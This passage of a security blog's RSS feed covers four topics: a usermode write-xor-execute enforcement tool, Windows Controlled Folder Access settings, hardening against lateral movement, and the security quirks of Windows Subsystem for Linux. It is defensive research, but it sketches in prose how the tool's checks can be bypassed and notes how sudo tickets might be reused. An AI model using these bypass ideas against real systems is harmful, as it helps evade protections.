+<p>The initial driver for me writing this code, before I decided to implement a full W^X policy with it, was to test for cases where an application under test would attempt to allocate RWX buffers, and if they actually needed those buffers to be executable (i.e. swap RWX for RW and see if you get a crash). For fun, I injected this DLL into a bunch of different programs. Many (e.g. notepad, calc) just work without problems, as they don&#8217;t rely on RWX memory at all. A number of others (e.g. Chrome, Spotify) crash due to JIT code that runs inside the process. It was quite fun to watch these allocations occur in realtime via debug messages.</p>
+<h2>Bypasses</h2>
+<p>There are a number of ways to bypass the PoC as it stands. I thought about eliminating them, but I think it&#8217;s more fun to go through the code and identify the problems.</p>
+<p>The first and most obvious way is to ROP to GetModuleHandle() and find the original APIs that way, totally bypassing the checks. It is possible to fix this to some extent by hooking GetModuleHandle() and similar APIs, but this mostly ends up as a cat-and-mouse game. This is why you should implement this stuff in kernelmode.</p>
+<p>The second way is a race condition. In both VirtualAlloc and VirtualProtect hooks we call the original function, then lock the tracking list and add the new allocation to the tracked list. It is possible to call either of these functions twice. This can be fixed with a global allocation mutex.</p>
+<p>There&#8217;s also a potential <a href="https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use" title="TOCTOU">TOCTOU</a> race condition in our VirtualProtect hook, where we check the page protection using VirtualQuery and later potentially call VirtualAlloc based on the result. However, the attacker would have to get the application to call the unhooked VirtualProtect in order to exploit this particular issue.</p>
+<p>Finally there&#8217;s a really interesting case &#8211; marking a page as writable, filling it with data, freeing it, then re-allocating as read-execute and hoping that you get the same page back before it gets reset to zeroes by the OS. In fact, when I thought of this issue, I wondered whether I might have stumbled across a potential mitigation bypass in the real W^X implementation for Windows, and my eyes turned into dollar signs. Thankfully (or sadly) the clever folks at Microsoft thought of this already, and forced every released page to be reset.</p>
+<h2>Closing words</h2>
+<p>I hope that this ham-fisted approach to implementing W^X has been of some educational use, at least in terms of thinking about how the protection can be implemented in practice. If you&#8217;d like to follow along at home, the code can be found in the <a title="WXPolicyEnforcer" href="https://github.com/portcullislabs/WXPolicyEnforcer">WXPolicyEnforcer</a> project on the Portcullis Labs GitHub. It is released under MIT license.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/">Enforcing a write-xor-execute memory policy from usermode</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Windows 10’s &#8220;Controlled Folder Access&#8221; feature</title>
+		<link>https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/</link>
+		<comments>https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/#comments</comments>
+		<pubDate>Thu, 16 Nov 2017 09:44:52 +0000</pubDate>
+		<dc:creator><![CDATA[RGH]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6110</guid>
+		<description><![CDATA[<p>Microsoft released a rolling upgrade of Windows 10 in October 2017. The &#8220;Fall Creators&#8221; edition (version 1709, codename Redstone 3) contains a new feature called &#8220;Controlled Folder Access&#8221;, which is designed to combat ransomware attacks. Controlled Folder Access is part of Windows Defender Security Centre that works with Windows Defender Anti-Virus to prevent &#8220;suspicious&#8221; executable [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/">Windows 10’s &#8220;Controlled Folder Access&#8221; feature</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Microsoft released a rolling upgrade of Windows 10 in October 2017. The &#8220;Fall Creators&#8221; edition (version 1709, codename Redstone 3) contains a new feature called &#8220;Controlled Folder Access&#8221;, which is designed to combat ransomware attacks.<span id="more-6110"></span></p>
+<p>Controlled Folder Access is part of Windows Defender Security Centre that works with Windows Defender Anti-Virus to prevent &#8220;suspicious&#8221; executable files, DLLs, and scripts from writing to (or encrypting) files within certain folders.</p>
+<h2>What folders are protected?</h2>
+<p>While additional folders can be added, the following locations will always be monitored when Controlled Folder Access is enabled:</p>
+<ul>
+<li>User: Documents, Pictures, Videos, Music, Desktop, Favorites</li>
+<li>Public: Documents, Pictures, Videos, Music, Desktop</li>
+</ul>
+<h2>How does Windows determine what `suspicious&#8217; code is?</h2>
+<p>It’s what Windows Defender Anti-Virus identifies. As such Controlled Folder Access relies on Windows Defender Anti-Virus to be running.</p>
+<h2>What about application false positives?</h2>
+<p>It may be the case that legitimate applications are incorrectly flagged by Windows Defender Anti-Virus as being `suspicious&#8217; preventing or hindering legitimate use. Such applications can be white-listed.</p>
+<p>To facilitate this, Controlled Folder Access supports an `audit&#8217; mode, where an event is generated when the application would normally be prevented from writing to a protected folder. Those events can be reviewed to identify legitimate applications that can be added to the white-list.</p>
+<h2>Is Controlled Folder Access enabled by default? How do I configure it?</h2>
+<p>Controlled Folder Access is not enabled by default and can be configured via:</p>
+<ul>
+<li>The User Interface</li>
+<li>Group Policy (a Group Policy would need to be configured on a system that contains the correct administrative templates for the options to be available for selection): Computer Configuration > Administrative Templates > Windows Components > Windows Defender Anti-Virus > Windows Defender Exploit Guard > Controlled Folder Access</li>
+<li>Manual Registry modification (i.e. via a script)</li>
+<li>PowerShell cmdlets:</li>
+</ul>
+<pre class="brush: powershell; gutter: false; title: ; notranslate">
+Set-MpPreference -EnableControlledFolderAccess [Enable | Disable | Audit]
+Add-MpPreference -ControlledFolderAccessProtectedFolders c:\path\to\protect,c:\other\path
+Remove-MpPreference -ControlledFolderAccessProtectedFolders c:\path\to\no\longer\protect
+</pre>
+<p>Note: Set-MpPreference can also be used to specify folder items but will clear the list first, whereas Add-MpPreference adds to the list.</p>
+<h2>What Registry keys are used by Controlled Folder Access?</h2>
+<h3>Is Controlled Folder Access enabled?</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Registry path: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exploit Guard\Controlled Folder Access
+Registry Key: GuardMyFolders
+Key Type: REG_DWORD
+Key Value: 0
+</pre>
+<h3>Protected Folders</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Registry path: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exploit Guard\Controlled Folder Access\ProtectedFolders
+Registry Key: audit
+Key Type: REG_DWORD
+Key Value: 0
+</pre>
+<h3>To specify protected folders:</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Registry path: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exploit Guard\Controlled Folder Access\ProtectedFolders
+Registry Key: Full path to protect, i.e. c:\test
+Key Type: REG_DWORD
+Key Value: 0&lt;/code&gt;
+</pre>
+<h2>What can be protected? Any limitations?</h2>
+<p>Network shares and mapped drives can be protected, but Controlled Folder Access does not support the use of:</p>
+<ul>
+<li>Environment Variables</li>
+<li>Wildcards</li>
+<li>The Windows drive (typically C:\)</li>
+</ul>
+<p>Seriously, don’t protect the entire Windows drive as Windows will be unable to function correctly and strange behaviour will result.</p>
+<h3>What happens when write access is blocked?</h3>
+<p>A notification is displayed that provides the path of the executable that was blocked, and the path of protected folder that the write attempt was for. This information is also recorded in the event log, using the following event values:</p>
+<ul>
+<li>Event ID: 5007: Event when settings are changed</li>
+<li>Event ID: 1124: Audited Controlled folder access event</li>
+<li>Event ID: 1123: Blocked Controlled folder access event</li>
+</ul>
+<p>The following image shows the notification of a write action being blocked:</p>
+<p><a name="imageclose-6111"><div class="lb-album"><a href="#image-6111"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2017/11/VirtualBox_Win10_Ent_90days_02_11_2017_14_17_19-300x225.png" alt="Blocked write access notification" class="size-medium wp-image-6121"><span></span></a></div>              
+<a href="#imageclose-6111" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6111">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2017/11/VirtualBox_Win10_Ent_90days_02_11_2017_14_17_19.png" alt="image-6111">
+                   </div></a></p>
+<h3>Can the blocked write notification message be customised?</h3>
+<p>Yes, at least for Enterprise environments. Providing details of who to contact (service desk, IT Security, etc.) can be included in the notification message via the following Group Policy settings:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Computer Configuration &gt; Policies &gt; Adminstrative Templates &gt; Windows Components &gt; Windows Defender Security Center &gt; Enterprise Customization
+</pre>
+<ul>
+<li> Set &#8220;Configure customized contact information&#8221; to &#8220;Enabled&#8221;</li>
+<li> Set &#8220;Configure customized notifications&#8221; to &#8220;Enabled&#8221;</li>
+<li> Set &#8220;Specify contact compant name&#8221; to &#8220;Enabled&#8221; and add the company details</li>
+<li> Enable and set at least one of the following:
+<ul>
+<li>&#8220;Specify contact email address or EmailID&#8221;</li>
+<li>&#8220;Specify contact phone number or Skype ID&#8221;</li>
+<li>&#8220;Specify contact web site&#8221;</li>
+</ul>
+</li>
+</ul>
+<h3>Does Controlled Folder Access work with third-party Anti-Virus applications?</h3>
+<p>No, or at least not in the tests performed when writing this post. Controlled Folder Access requires the use of Windows Defender Anti-Virus to be active.</p>
+<p>Most third-party Anti-Virus solutions replace existing products, and attempting to run multiple Anti-Virus solutions at the same time can significantly hinder system performance, or even lead to each one preventing the other from being able to scan files or removable drives which could lower protections. One Anti-Virus program might flag others as being infected (i.e. triggering on the detection patterns) or malicious, and quarantine key files – potentially breaking that product.</p>
+<h3>How can I tell Controlled Folder Access and Notifications are configured and working?</h3>
+<p>Microsoft have produced an ExploitGuard CFA File Creator tool to trigger Controlled Folder Access actions, which causes notifications to be displayed.</p>
+<p>Details on the <a href="https://docs.microsoft.com/en-us/windows/threat-protection/windows-defender-exploit-guard/evaluate-controlled-folder-access#use-the-demo-tool-to-see-how-controlled-folder-access-works" title="ExploitGuard CFA Demo Tool">ExploitGuard CFA Demo Tool</a>, and a link to download it, can be found on Microsoft&#8217;s web site.</p>
+<h2>Conclusion</h2>
+<p>For home users or business that do not have a corporate Anti-Virus solution, Windows Defender Anti-Virus and Controlled Folder Access will be better than nothing.<br />
+However, larger businesses typically have existing enterprise-wide Anti-Virus solutions in which significant time and effort (and money) has been invested. It would be difficult to convince the IT Security teams of such companies to throw out that investment, so I don’t expect Controlled Folder Access to be used much in large businesses.</p>
+<p>Controlled Folder Access is a new feature, and it may be that Microsoft modify it to work with third-party Anti-Virus products in the future.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/">Windows 10’s &#8220;Controlled Folder Access&#8221; feature</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Hindering Lateral Movement</title>
+		<link>https://labs.portcullis.co.uk/blog/hindering-lateral-movement/</link>
+		<comments>https://labs.portcullis.co.uk/blog/hindering-lateral-movement/#comments</comments>
+		<pubDate>Fri, 27 Oct 2017 12:53:52 +0000</pubDate>
+		<dc:creator><![CDATA[RGH]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6092</guid>
+		<description><![CDATA[<p>Lateral Movement is a method used by attackers (or malware) against a network Domain. After an initial device is compromised (typically, a user&#8217;s workstation), the attacker extracts passwords from memory, or obtains encrypted password hashes from the system for cracking or direct use (i.e. Pass the Hash). The attacker then attempts to login to other [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/hindering-lateral-movement/">Hindering Lateral Movement</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Lateral Movement is a method used by attackers (or malware) against a network Domain. After an initial device is compromised (typically, a user&#8217;s workstation), the attacker extracts passwords from memory, or obtains encrypted password hashes from the system for cracking or direct use (i.e. Pass the Hash). The attacker then attempts to login to other systems using those credentials to search for cached passwords of privileged Domain accounts. Usually, the local Administrator account is targeted as the password is often the same on all systems (due to the common practice of deploying systems from a master image), but service accounts, etc. can also be targeted.<span id="more-6092"></span></p>
+<p>In some cases, an attacker is able to move from having local Administrator access on a workstation to gaining full Domain Admin rights on the Domain in under an hour.</p>
+<p>Since Active Directory typically controls access to highly sensitive information, it is important to try and prevent lateral attacks from working. Being able to spot these attacks would also be good.</p>
+<h2>Limit workstation to workstation communications</h2>
+<p>It is highly unusual for network users to need to directly communicate with other users’ workstations.</p>
+<p>Configure each workstation to use a local firewall to block incoming Windows network traffic (139/TCP, 445/TCP and 137/UDP) from any workstation subnet. </p>
+<p>If using a firewall that supports different network zones (such as the Windows Firewall), ensure the appropriate zone profiles are configured, or simply configure all profiles. If your organisation uses VoIP telephones, prevent those subnets from connecting as well to protect against either a malicious internal employee, or in case the attacker is able to convince a user to try changing network connections.</p>
+<h2>Prevent local users from logging in over the network</h2>
+<p>If an attacker finds that they cannot directly connect to other workstations to hunt for privileged cached credentials, they may attempt to compromise a server and try to login to workstations from there. To protect against this, configure the User Rights policy &#8216;Deny access to this computer from the network&#8217; by adding local user accounts.</p>
+<h2>Use a local Administrator password management tool</h2>
+<p>Tools, such as Microsoft LAPS, exist that set unique passwords for the local administrator account. By using such tools, when a password exceeds its expiration date the password will be changed automatically when the Group Policy is refreshed. Avoid writing a custom password management system, as it is very difficult to implement such things without error; if an attacker is able to determine a pattern to setting the password, then that defence is gone.</p>
+<h2>Configure systems via Group Policy</h2>
+<p>To reduce the risk of credentials being captured, avoid logging into systems where not necessary. Use Group Policies to configure workstations and servers instead of directly logging into them, where possible. Systems may be configured to cache credentials when users login, and this information can be obtained by an attacker and then cracked offline to reveal the plain text password for that user account. If an attacker already has a foothold on a system and a Domain Administrator logs in, the attacker may be able to impersonate the Domain Administrator in order to utilise their privileges within the network Domain.</p>
+<h2>Use dedicated administrative accounts and workstations</h2>
+<p>An attacker can only extract privileged password data if it is present on the system. Ensure administrative users have user accounts that are separate from their day-to-day user accounts and configure them so that they cannot login to normal workstations or servers; they should only be used to login to Active Directory servers to manage them, and configure Group Policies to manage other systems.</p>
+<p>Dedicated management workstations should not be able to access the Internet or email.</p>
+<h2>Disable &#8216;WDigest&#8217;</h2>
+<p>Windows supports several Security Support Providers (SSPs), used to handle authentication requests (including Single Sign On). Until recently (Window 8.1 and Server 2012 R2 or higher), Windows used by default an SSP called &#8216;WDigest&#8217; &#8211; which stored user credentials in plain text in memory, allowing a process with local Administrator privileges to extract the passwords of all logged-in users.</p>
+<p>To help address this issue, Microsoft created a new Registry key for &#8216;WDigest&#8217; to disable storing plain text passwords, which can be applied to Windows, prior to 8.1 and Server 2012 R2 by installing KB2871997 and configuring the following Registry setting:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Registry Path: HKLM\System\CurrentControlSet\Control\SecurityProviders\Wdigest
+Key Name: UseLogonCredential
+Key Type: REG_DWORD
+Key Value: 0
+</pre>
+<p>Alternatively, KB2871997 can be configured via Group Policy by installing the PtH.admx/adml files provided with the Microsoft Security Compliance Manager (SCM) via:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Local Policies &gt; Administrative Templates &gt; SCM: Pass the Hash Mitigations &gt; Wdigest Authentication
+</pre>
+<h2>Apply enhanced credentials protection updates</h2>
+<p>In addition to the protections added by KB2871997, Microsoft have released an updated that further protects against Pass the Hash (PtH) attacks for Windows 7, Windows 8, Server 2008 R2 and Server 2012. </p>
+<h2>KB3126593 (MS16-014)</h2>
+<p>This update adds support for the TokenLeakDetectDelaySecs Registry setting which can be used to force credentials to be cleared after a user logs off. To set clearing credentials 30 seconds after user logout (the default behaviour in Windows 8.1 and Windows 10), configure the following Registry setting:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Registry Path: HKLM\System\CurrentControlSet\Control\Lsa
+Key Name: TokenLeakDetectDelaySecs
+Key Type: REG_DWORD
+Key Value: 30
+</pre>
+<h2>Upgrade Windows servers and workstations</h2>
+<p>With each new version of Windows, Microsoft adds additional security features, including protections for the LSASS service to protect against credential stealing and adding additional logging options. Upgrade servers to Server 2016 and upgrade workstations to Windows 10 and configure them to make use of these new features. </p>
+<h2>Enable event monitoring and investigate alerts</h2>
+<p>A centralised logging and monitoring solution provides an opportunity for recording actions and events that take place on systems, and prevents a successful attacker from clearing the event log to hide their actions.</p>
+<p>Configure all Windows systems to log events to a centralised system and monitor for account login attempts (both successful and unsuccessful).<br />
+Any events that reference local accounts (or Domain Administrator/privileged accounts) and not Domain accounts should be investigated as a matter of priority. </p>
+<p>The following Windows event codes are generated by Windows 2008 and later:</p>
+<ul>
+<li>Event ID: 4624: Account login successful</li>
+<li>Event ID: 4625: Account login failed</li>
+</ul>
+<p>The corresponding events for Windows 2003 and earlier:</p>
+<ul>
+<li>Event ID: 528: Account login successful</li>
+<li>Event ID: 540: Network account login successful</li>
+<li>Event ID: 529: Login failure &#8211; Unknown user or bad password</li>
+</ul>
+<p>Other potentially interesting event code are:</p>
+<ul>
+<li>Event ID: 4625: An account failed to login (Windows 2008 and later)</li>
+<li>Event ID: 531: Login failure &#8211; Account currently disabled (Windows 2003 and earlier)</li>
+</ul>
+<h2>Conclusion</h2>
+<p>A number of options have been presented to hinder Lateral Movement attacks, and some readers might be wondering which option to implement. The answer is &#8220;all of them, where possible&#8221;. Security is a &#8220;defence in depth&#8221; game, and every obstacle that an attacker has to work around is worth implementing.</p>
+<p>In addition to hindering lateral movement, monitoring for attacks or suspicious behaviour and investigating alerts will help identify more sophisticated attacks, as well as indicating that suspicious activities are occurring.</p>
+<p>A <a href="https://blogs.cisco.com/security/can-your-organisation-be-breached-find-out-with-a-red-team" title="Red Team">Red Team Assessment</a> can be undertaken to determine the effectiveness of the security controls in place during an attack against your network. Whilst the assessment is taking place it also provides an opportunity to determine whether the internal monitoring and response capabilities intended to detect and alert when a potential attack is occurring within your network are effective. Following completion of the assessment you will have a clear view of any additional measures that should be implemented to improve both defence and monitoring capabilities within your network.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/hindering-lateral-movement/">Hindering Lateral Movement</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/hindering-lateral-movement/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Exploring Windows Subsystem for Linux</title>
+		<link>https://labs.portcullis.co.uk/blog/exploring-windows-subsystem-for-linux/</link>
+		<comments>https://labs.portcullis.co.uk/blog/exploring-windows-subsystem-for-linux/#comments</comments>
+		<pubDate>Thu, 27 Jul 2017 09:00:04 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5869</guid>
+		<description><![CDATA[<p>Whilst there has been quite a lot of analysis of Microsoft&#8217;s new Windows Subsystem for Linux (aka WSL or Bash on Ubuntu on Windows) and how it functions (particularly from Alex Ionescu), most of this has focused on how it affects the Windows security model. Being a keen UNIX focused researcher, I decided to take [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/exploring-windows-subsystem-for-linux/">Exploring Windows Subsystem for Linux</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Whilst there has been quite a lot of analysis of Microsoft&#8217;s new <a title="Windows Subsystem for Linux" href="https://msdn.microsoft.com/en-gb/commandline/wsl/about">Windows Subsystem for Linux</a> (aka WSL or Bash on Ubuntu on Windows) and how it functions (particularly from <a title="Alex Ionescu" href="https://github.com/ionescu007/lxss">Alex Ionescu</a>), most of this has focused on how it affects the Windows security model. Being a keen UNIX focused researcher, I decided to take it for a spin.<span id="more-5869"></span></p>
+<p>The first thing I did once I had it installed was look at how the Windows process tree had changed. Running it results in two new branches to your process tree. The first contains the Windows bash.exe instance which hosts your new terminal:</p>
+<ul>
+<li>explorer.exe (runs as your user):
+<ul>
+<li>bash.exe (runs as your user):
+<ul>
+<li>conhost.exe (runs as your user)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>Whilst the second contains the Linux process tree:</p>
+<ul>
+<li>svchost.exe (runs as SYSTEM):
+<ul>
+<li>init (runs as your user, no disabled privileges, locked into a job):
+<ul>
+<li>bash (runs as your user, disabled privileges, locked into a job, break away set to true)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>As you might expect, new code compiled to support this is well hardened and uses Windows 10&#8242;s advanced mitigations. Specifically, bash.exe has the following mitigations enabled:</p>
+<ul>
+<li>DEP enabled</li>
+<li>ASLR high entropy, bottom up</li>
+<li>CFG enabled</li>
+</ul>
+<p>Digging a little further, the same can&#8217;t be said for init, bash and other parts of the Linux process tree. Whilst DEP is enabled, ASLR and CFG are not. In fairness, this shouldn&#8217;t come as any great surprise &#8211; they&#8217;re Ubuntu packaged binaries however it does start to show show how introducing WSL to your system can change the systems posture.</p>
+<h2>The kernel</h2>
+<p>So what does the &#8220;kernel&#8221; version look like. Well, at the point I examined it:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+x@DESKTOP-L4857K3:~$ uname -a
+Linux DESKTOP-L4857K3 3.4.0+ #1 PREEMPT Thu Aug 1 17:06:05 CST 2013 x86_64 x86_64 x86_64 GNU/Linux
+</pre>
+<p>This version of the Linux kernel should be vulnerable to <a title="dirty cow" href="https://dirtycow.ninja/">dirty cow</a>, so what of it? It doesn&#8217;t work which again isn&#8217;t a huge surprise. As Alex has alluded to there is a quite a substantial amount of mapping going on to implement the Linux system calls on Windows and whilst they should be API compatible, the implementations between a real Linux kernel and what WSL gives up may be quite different.</p>
+<p>This does however bring up the first critical point: There is no relationship between the patches supplied as part of Windows Update and what goes on with WSL. If you don&#8217;t patch regularly you&#8217;ll still be vulnerable to a whole plethora of Ubuntu (userland) vulnerabilities.</p>
+<h2>Memory corruption mitigations</h2>
+<p>Some Linux mitigations are in play however (as they would be on any real Ubuntu system) as can be seen with <a title="checksec.sh" href="http://www.trapkit.de/tools/checksec.html">checksec.sh</a>:</p>
+<ul>
+<li>System-wide ASLR (kernel.randomize_va_space): On (Setting: 2)</li>
+<li>Does the CPU support NX: Yes</li>
+</ul>
+<p>And of course binaries are compiled with whatever <a title="Ubuntu hardening" href="https://wiki.ubuntu.com/Security/Features">Ubuntu hardening</a> is currently supported:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+	COMMAND    PID RELRO             STACK CANARY           NX/PaX        PIE
+	  init      1 Full RELRO        Canary found           NX enabled    Dynamic Shared Object
+	  sudo     14 Partial RELRO     Canary found           NX enabled    Dynamic Shared Object
+	    su     15 Partial RELRO     Canary found           NX enabled    No PIE
+	  bash     16 Partial RELRO     Canary found           NX enabled    No PIE
+	  bash      2 Partial RELRO     Canary found           NX enabled    No PIE
+</pre>
+<h2>Shared memory</h2>
+<p>So what does WSL look like more generally. Well, since I&#8217;ve had some fun with <a title="shared memory" href="https://labs.portcullis.co.uk/whitepapers/memory-squatting-attacks-on-system-v-shared-memory/">shared memory</a>, I wondered how this was implemented. Well, it turns out that it&#8217;s not:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+root@DESKTOP-L4857K3:~# ipcs
+
+kernel not configured for shared memory
+
+kernel not configured for semaphores
+
+kernel not configured for message queues
+</pre>
+<p>Whether this will have any security implications, it&#8217;s difficult to say but at the very least it may stop certain applications from working. Other applications may revert to using other less well tested IPC mechanisms which may expose security issues along the way.</p>
+<h2>Debugging</h2>
+<p>Moving on, how about debugging something. A simple tool which exercises the ptrace() system call is strace. Here&#8217;s what happens when strace is run on a normal process:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+root@DESKTOP-L4857K3:/sys# strace -f printf &quot;test&quot; 2&gt;&amp;1 | head -n 5
+execve(&quot;/usr/bin/printf&quot;, [&quot;printf&quot;, &quot;test&quot;], [/* 15 vars */]) = 0
+brk(0)                                  = 0xa9d000
+...
+</pre>
+<p>However you can&#8217;t strace PID 1 (as would have been possible on real Linux), instead ptrace() returns an error: &#8220;Operation not permitted&#8221;.</p>
+<h2>File systems</h2>
+<p>Whilst /mnt doesn&#8217;t show up as a different file system, /mnt/c is actually used to map the underlying Windows system disk. This is immediately peculiar since it is mapped with permissions of 0777 (world readable, world writable amongst others). Moreover any files created under it are created with an owner of root. You&#8217;d think this might be a problem but from what I&#8217;ve seen so far, assuming the Windows file permissions are set right then (because everything (even setUID processes) runs as you from Windows&#8217; perspective) you won&#8217;t be able to access anything inappropriate (think SAM etc). It. Just. Looks. Weird.</p>
+<p>Furthermore, the way that WSL implements umasks too is an oddity. umask doesn&#8217;t work on all file system types and in particular the aforementioned /mnt/c. Observe the following:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+root@DESKTOP-L4857K3:/# umask 666
+root@DESKTOP-L4857K3:/# touch foo
+root@DESKTOP-L4857K3:/# ls -la foo
+---------- 1 root root 0 Mar 28 23:10 foo
+root@DESKTOP-L4857K3:~# rm foo
+root@DESKTOP-L4857K3:~# cd /mnt/c/Users/x/
+root@DESKTOP-L4857K3:/mnt/c/Users/x# touch foo
+root@DESKTOP-L4857K3:/mnt/c/Users/x# ls -la foo
+-rwxrwxrwx 1 root root 0 Mar 28 23:10 foo
+</pre>
+<p>Umask is honoured in the first location but not the second (a umask of 0666 should mean that files are created with no permissions). Whilst there&#8217;s a fundamental Windows reason why this is the case, there is nothing to indicate this to the Ubuntu instance&#8217;s userland and thus files created within your home directory might be created with undesirable permissions. Microsoft are tracking this in the GitHub as <a title="issue 352" href="https://github.com/Microsoft/BashOnWindows/issues/352">issue 352</a>.</p>
+<h2>Authentication</h2>
+<p>Unlike on a real Ununtu there&#8217;s no terminal level authentication (whilst user accounts within the Ubuntu instance do have passwords, they&#8217;re not needed unless you want to access the system remotely or gain root privileges via sudo). Moreover, from Windows&#8217; perspective there is no difference between UID 0 and UID 1000. You can start a terminal and then use sudo to elevate your privileges and Windows will be none the wiser (Linux capabilities aren&#8217;t mapped into Windows user rights or special tokens). That might mean that users won&#8217;t care too much about their Ubuntu instance&#8217;s passwords but as you can imagine with no password policy enforcement, users might be tempted to reuse their Windows passwords.</p>
+<p>I should also note that whilst sudo prompts for a password on each new instance of bash.exe/conhost.exe pair hosting a terminal however if you authenticate to sudo, close the terminal and then reopen it, then your sudo ticket may still be valid &#8211; this requires exact co-ordination as sudo sessions are tracked by PID, however the first terminal opened will always have a Linux bash process with a PID of 2 which may well be blessed from a previous sudo session.</p>
+<h2>Privileges</h2>
+<p>Finally, as per issue <a title="issue 561" href="https://github.com/Microsoft/BashOnWindows/issues/561">issue 561</a>, because everything runs as you from Windows&#8217; perspective, the only way to successfully execute ping (which requires an ICMP raw socket on Linux) is to run bash.exe in elevated mode (as Administrator). This, despite the fact that a non-elevated user can quite happily execute ping on the Windows host. WSL doesn&#8217;t even implement concept of root in any real sense, let along implement the necessary Linux syscalls to support capabilities in any useful fashion. This in turn means that everything else spawned from the elevated shell also runs with Windows administrative privileges. For comparison, here&#8217;s what the new branches of your process tree will look like:</p>
+<ul>
+<li>wininit.exe.exe (runs as SYSTEM):
+<ul>
+<li>services.exe (runs as SYSTEM):
+<ul>
+<li>svchost.exe (runs as SYSTEM):
+<ul>
+<li>RuntimeBroker.exe (runs as your user, disabled privileges, not elevated):
+<ul>
+<li>bash.exe (runs as your user, disabled privileges, elevated):
+<ul>
+<li>conhost.exe (runs as your user, disabled privileges, elevated)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>The first contains the Windows bash.exe instance which hosts your new terminal, whilst the second contains the Linux process tree:</p>
+<ul>
+<li>svchost.exe (runs as SYSTEM):
+<ul>
+<li>init (runs as your user, no disabled privileges, locked into a job, elevated):
+<ul>
+<li>bash (runs as your user, disabled privileges, locked into a job, break away set to true, elevated):
+<ul>
+<li>sudo (runs as your user, disabled privileges, locked into a job, break away set to true, elevated):
+<ul>
+<li>ping (runs as your user, disabled privileges, locked into a job, break away set to true, elevated)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>Microsoft&#8217;s stock answer is that the Ubuntu instance (or rather the bash.exe instance hosting the terminal and accompanying lxss.sys kernel implementation) is locked down, effectively sandboxed by a combination of Windows DACLs, the concept of <a href="jobs" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684161(v=vs.85).aspx">jobs</a> (touched upon at the start and akin to Linux <a title="cgroups" href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Resource_Management_Guide/ch01.html">cgroups</a>) and syscall mapping that effectively uses lxss.sys to <a title="proxy" href="https://blogs.msdn.microsoft.com/wsl/2016/06/08/wsl-system-calls/">proxy</a> most syscalls onto their corresponding NT kernel implementation.</p>
+<h2>Conclusion</h2>
